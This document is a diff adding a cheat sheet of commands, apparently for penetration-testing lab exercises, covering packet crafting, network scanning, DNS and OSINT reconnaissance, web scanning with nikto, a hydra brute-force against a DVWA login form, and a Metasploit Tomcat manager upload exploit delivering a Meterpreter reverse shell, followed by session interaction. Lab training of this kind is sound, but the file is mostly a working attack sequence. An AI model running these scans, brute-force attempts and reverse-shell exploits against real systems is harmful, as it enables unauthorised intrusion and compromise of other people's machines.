@@ -1,0 +1,107 @@
+ip a
+ping -c 3 <IP>
+
+scapy
+ls()
+lsc()
+
+ip = IP(dst="IP")
+tcp = TCP(dport=80)
+pkt = ip/tcp
+pkt2 = Ether()/IP()/TCP()
+del(ip.ttl)
+
+sr1(IP(dst="IP")/ICMP()/"MSG")
+sr1(IP(dst="IP")/TCP(dport=80, flags="S"))
+sr1(IP(dst="IP")/TCP(dport=80, flags="FP"), timeout=2)
+
+sudo tcpdump -i eth0 -s0 -w lab1.pcap
+
+nmap -sS -p80 <IP>
+
+whois domain
+
+dig +noall +answer domain
+dig +short NS domain
+dig +short MX domain
+dig +short -x IP
+
+theHarvester -d domain -b bing -l 200 -f harvester_bing
+
+sublist3r -d domain -o s.txt
+amass enum -passive -d domain -o a.txt
+
+recon-ng
+workspaces create lab2
+marketplace install recon/domains-hosts/bing_domain_web
+modules load recon/domains-hosts/bing_domain_web
+options set SOURCE domain
+run
+show hosts
+export csv ~/nes555/lab2/hosts.csv hosts
+
+mkdir -p ~/nes555/lab3 && cd ~/nes555/lab3
+sudo tcpdump -i eth0 -w lab3.pcap &
+
+sudo nmap -sn NET/24 -oN ping_sweep.txt
+sudo nmap -PR NET/24 -oN arp_sweep.txt
+
+sudo nmap -Pn -sS -T4 -p1-1024 IP -oA quick
+sudo nmap -sS -sV -sC -p- -T4 IP -oA full
+
+sudo nmap -sU -p53,67,69,123,161 IP -oN udp.txt
+
+sudo hping3 -1 -c4 IP
+sudo hping3 -S -p80 -c3 IP
+sudo hping3 -A -p80 -c3 IP
+sudo hping3 -F -p80 -c3 IP
+
+echo -e "HEAD / HTTP/1.0\n\n" | nc IP 80
+enum4linux -a IP > enum.txt
+
+nikto -Help
+nikto -host 192.168.68.12
+nikto -list-plugins
+nikto -Plugins outdated -host 192.168.68.12
+nikto -Plugins httpoptions -host 192.168.68.12
+nikto -Plugins tests -host 192.168.68.12
+nikto -host 192.168.68.12 -output ~/nes555/lab4/nikto_report.html
+
+hydra -L /usr/share/wordlists/common_usernames.txt \
+-P /usr/share/wordlists/rockyou.txt \
+192.168.68.12 http-post-form \
+"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
+-V -t 4
+
+use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS 192.168.56.106
+set RPORT 8180
+run
+
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS 192.168.56.106
+set RPORT 8180
+set HttpUsername <user>
+set HttpPassword <pass>
+set LHOST <your_IP>
+set LPORT 4444
+set PAYLOAD java/meterpreter/reverse_tcp
+exploit
+
+sessions -i <id>
+sysinfo
+
+nmap
+zenmap
+masscan
+hping3
+nc
+enum4linux
+tcpdump
+wireshark
+theHarvester
+openvas
+nikto
+burpsuite
+hydra
+firefox
